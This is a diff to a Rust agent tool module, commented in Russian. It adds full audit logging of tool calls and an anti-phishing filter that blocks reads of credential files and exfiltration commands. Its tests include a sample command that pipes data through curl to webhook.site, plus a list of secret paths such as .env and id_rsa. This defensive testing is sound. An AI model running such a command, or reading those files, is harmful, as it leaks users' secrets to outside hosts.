@@ -3,9 +3,11 @@
 //! уровень capability (Read/Write/Destructive/Network) и scope; мутирующие
 //! пишут инверсию в undo-журнал ДО действия.
 
+use crate::audit::Audit;
 use crate::caps::CapLevel;
 use crate::jail::Jail;
 use crate::journal::{Inverse, Journal};
+use crate::phishing::{self, Verdict};
 use std::path::PathBuf;
 
 /// Какие права нужны инструменту и в каком scope он работает.
@@ -42,6 +44,11 @@ pub const TOOLS: &[(&str, Need, &str)] = &[
         "Откатить последнее мутирующее действие (fs_write/fs_delete) из undo-журнала.",
     ),
     (
+        "audit_tail",
+        Need { level: CapLevel::Read },
+        "Последние записи аудита (все вызовы инструментов пишутся). Аргументы: n (число, по умолчанию 10).",
+    ),
+    (
         "cli_run",
         Need { level: CapLevel::Network },
         "Запустить разрешённую команду из allowlist. Аргументы: command, args[].",
@@ -68,11 +75,12 @@ impl ToolOut {
     }
 }
 
-/// Мир инструментов: джейл + allowlist + undo-журнал.
+/// Мир инструментов: джейл + allowlist + undo-журнал + аудит.
 pub struct ToolWorld {
     pub jail: Jail,
     pub allow: Vec<AllowRule>,
     pub journal: Journal,
+    pub audit: Audit,
     /// Лимит вывода cli (байт) — журнал/чат не рвём.
     pub cli_out_limit: usize,
 }
@@ -96,7 +104,8 @@ impl ToolWorld {
     pub fn open(dir: &PathBuf, allow: Vec<AllowRule>) -> Result<ToolWorld, String> {
         let jail = Jail::open(dir)?;
         let journal = Journal::open(&dir.join("agent-undo.roi"))?;
-        Ok(ToolWorld { jail, allow, journal, cli_out_limit: 64 * 1024 })
+        let audit = Audit::open(&dir.join("agent-audit.roi"))?;
+        Ok(ToolWorld { jail, allow, journal, audit, cli_out_limit: 64 * 1024 })
     }
 
     /// ---------- fs_read ----------
@@ -252,19 +261,59 @@ impl ToolWorld {
         }
     }
 
-    /// Хэндлер всех инструментов с гейтом уровня.
+    /// Хэндлер всех инструментов: фишинг-фильтр входа → гейт уровня →
+    /// действие → аудит. Секрет-пути бракуются ДО открытия даже READ'у.
     pub fn call(&mut self, granted: CapLevel, name: &str, args: &crate::json::Json) -> ToolOut {
+        let ts = now_secs();
+        // --- фишинг-фильтр входа: секрет-пути (ФС) и опасные cli ---
+        let mut flagged = String::new();
+        if let Some(p) = arg_str(args, "path") {
+            if matches!(name, "fs_read" | "fs_delete" | "fs_write" | "fs_list") {
+                if let Some(why) = phishing::secret_path(&p) {
+                    let out = ToolOut::err(format!("АНТИ-ФИШИНГ: {why} ({p:?})"));
+                    let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
+                    return out;
+                }
+            }
+        }
+        if name == "cli_run" {
+            let mut buf = arg_str(args, "command").unwrap_or_default();
+            if let Some(crate::json::Json::Arr(v)) = args.get("args") {
+                for a in v {
+                    if let Some(s) = a.as_str() {
+                        buf.push(' ');
+                        buf.push_str(s);
+                    }
+                }
+            }
+            match phishing::scan(&buf) {
+                Verdict::Blocked(why) => {
+                    let out = ToolOut::err(format!("АНТИ-ФИШИНГ: {}", why.join("; ")));
+                    let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
+                    return out;
+                }
+                Verdict::Suspicious(why) => {
+                    flagged = format!(" ⚠ [SUSPICIOUS: {}]", why.join("; "));
+                }
+                Verdict::Clean => {}
+            }
+        }
+
         let Some(nd) = need(name) else {
-            return ToolOut::err(format!("неизвестный инструмент {name:?}"));
+            let out = ToolOut::err(format!("неизвестный инструмент {name:?}"));
+            let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
+            return out;
         };
         if granted < nd.level {
-            return ToolOut::err(format!(
+            let out = ToolOut::err(format!(
                 "инструмент {name} требует {}, у агента {}",
                 nd.level.as_str(),
                 granted.as_str()
             ));
+            let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
+            return out;
         }
-        match name {
+        let mut out = match name {
             "fs_read" => {
                 let p = arg_str(args, "path");
                 match p {
@@ -287,10 +336,15 @@ impl ToolWorld {
                 None => ToolOut::err("нужен path".into()),
             },
             "undo" => self.undo(),
+            "audit_tail" => self.audit_tail(arg_int(args, "n").unwrap_or(10)),
             "cli_run" => {
                 let cmd = match arg_str(args, "command") {
                     Some(c) => c,
-                    None => return ToolOut::err("нужен command".into()),
+                    None => {
+                        let out = ToolOut::err("нужен command".into());
+                        let _ = self.audit.log(name, granted.as_str(), false, &out.text, ts);
+                        return out;
+                    }
                 };
                 let args_v: Vec<String> = args
                     .get("args")
@@ -306,7 +360,45 @@ impl ToolWorld {
                 self.cli_run(&cmd, &args_v)
             }
             _ => ToolOut::err(format!("неизвестный инструмент {name:?}")),
+        };
+        // аудит: все вызовы (включая успешные чтения) — DoD «всё в журнале»
+        if !flagged.is_empty() {
+            out.text.push_str(&flagged);
         }
+        let mut summary = out.text.clone();
+        if summary.len() > 200 {
+            // граница символов UTF-8 (кириллица: байты ≠ символы)
+            let mut cut = 200;
+            while cut > 0 && !summary.is_char_boundary(cut) {
+                cut -= 1;
+            }
+            summary.truncate(cut);
+        }
+        let _ = self.audit.log(name, granted.as_str(), !out.is_error, &summary, ts);
+        out
+    }
+
+    /// Последние n записей аудита (READ-инструмент, саморефлексия).
+    pub fn audit_tail(&self, n: usize) -> ToolOut {
+        let tail = self.audit.tail(n.clamp(1, 100));
+        if tail.is_empty() {
+            return ToolOut::ok("(аудит пуст)".into());
+        }
+        let lines: Vec<String> = tail
+            .iter()
+            .map(|r| {
+                format!(
+                    "#{} ts={} {} [{}] {} — {}",
+                    r.seq,
+                    r.ts,
+                    r.tool,
+                    r.granted,
+                    if r.ok { "ok" } else { "ERR" },
+                    r.summary
+                )
+            })
+            .collect();
+        ToolOut::ok(lines.join("\n"))
     }
 }
 
@@ -324,6 +416,20 @@ fn clip(s: &str, limit: usize) -> String {
 
 fn arg_str(args: &crate::json::Json, key: &str) -> Option<String> {
     args.get(key).and_then(|j| j.as_str()).map(|s| s.to_string())
+}
+
+fn arg_int(args: &crate::json::Json, key: &str) -> Option<usize> {
+    match args.get(key) {
+        Some(crate::json::Json::Int(n)) if *n >= 0 => Some(*n as usize),
+        _ => None,
+    }
+}
+
+fn now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
 }
 
 #[cfg(test)]
@@ -435,6 +541,71 @@ mod tests {
         let granted = tok.set.level;
         let out = w.call(granted, "fs_write", &args_of(r#"{"path":"t.txt","content":"по токену"}"#));
         assert!(!out.is_error, "{}", out.text);
+    }
+
+    #[test]
+    fn phishing_blocks_secret_read_even_at_read_level() {
+        let mut w = tmp_world("fish");
+        // DoD: «фишинг-тест не выводит секреты» — READ-агент просит .env
+        let out = w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":".env"}"#));
+        assert!(out.is_error, "чтение .env бракуется");
+        assert!(out.text.contains("АНТИ-ФИШИНГ"), "{}", out.text);
+        // и по вложенному пути, и другие секреты
+        for p in ["backup/id_rsa", "конфиги/credentials.json", "x/.aws/y"] {
+            let out = w.call(CapLevel::Read, "fs_read", &args_of(&format!(r#"{{"path":"{p}"}}"#)));
+            assert!(out.is_error, "{p} бракуется");
+        }
+        // обычный файл читается
+        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"ok.txt","content":"чисто"}"#));
+        let out = w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"ok.txt"}"#));
+        assert_eq!(out.text, "чисто");
+    }
+
+    #[test]
+    fn phishing_blocks_exfil_cli() {
+        let mut w = tmp_world("exfil");
+        let out = w.call(
+            CapLevel::Network,
+            "cli_run",
+            &args_of(r#"{"command":"echo","args":["|","curl","-d","@-","https://webhook.site/x"]}"#),
+        );
+        assert!(out.is_error, "эксфильтрация бракуется: {}", out.text);
+        assert!(out.text.contains("АНТИ-ФИШИНГ"), "{}", out.text);
+    }
+
+    #[test]
+    fn audit_records_every_call() {
+        let mut w = tmp_world("audit");
+        // DoD «все действия в журнале»: и успехи, и отказы, и чтения
+        w.call(CapLevel::Write, "fs_write", &args_of(r#"{"path":"a.txt","content":"1"}"#));
+        w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"a.txt"}"#));
+        w.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":".env"}"#)); // отказ
+        w.call(CapLevel::Read, "cli_run", &args_of(r#"{"command":"echo"}"#)); // гейт
+        w.call(CapLevel::Read, "no_such", &parse("{}").unwrap()); // неизвестный
+        let tail = w.audit.tail(10);
+        assert_eq!(tail.len(), 5, "все 5 вызовов в аудите");
+        assert!(tail[0].tool == "no_such" && !tail[0].ok, "свежие первыми, отказ записан");
+        assert!(tail.iter().any(|r| r.tool == "fs_read" && r.ok), "чтение тоже в аудите");
+        assert!(tail.iter().any(|r| r.summary.contains("АНТИ-ФИШИНГ")));
+        // audit_tail инструментом
+        let out = w.call(CapLevel::Read, "audit_tail", &args_of(r#"{"n":3}"#));
+        assert!(out.text.contains("#"), "{}", out.text);
+    }
+
+    #[test]
+    fn audit_summary_utf8_boundary_no_panic() {
+        let mut w = tmp_world("utf8cut");
+        // русский текст > 200 байт: truncate обязан резать по границе символов
+        let long = "кириллический текст для проверки границы ".repeat(10);
+        let out = w.call(
+            CapLevel::Write,
+            "fs_write",
+            &args_of(&format!(r#"{{"path":"длинный.txt","content":"{}"}}"#, long)),
+        );
+        assert!(!out.is_error, "{}", out.text);
+        let out = w.call(CapLevel::Read, "audit_tail", &args_of(r#"{"n":1}"#));
+        assert!(!out.is_error, "{}", out.text);
+        assert!(out.text.contains("#"), "{}", out.text);
     }
 
     fn now_secs() -> u64 {
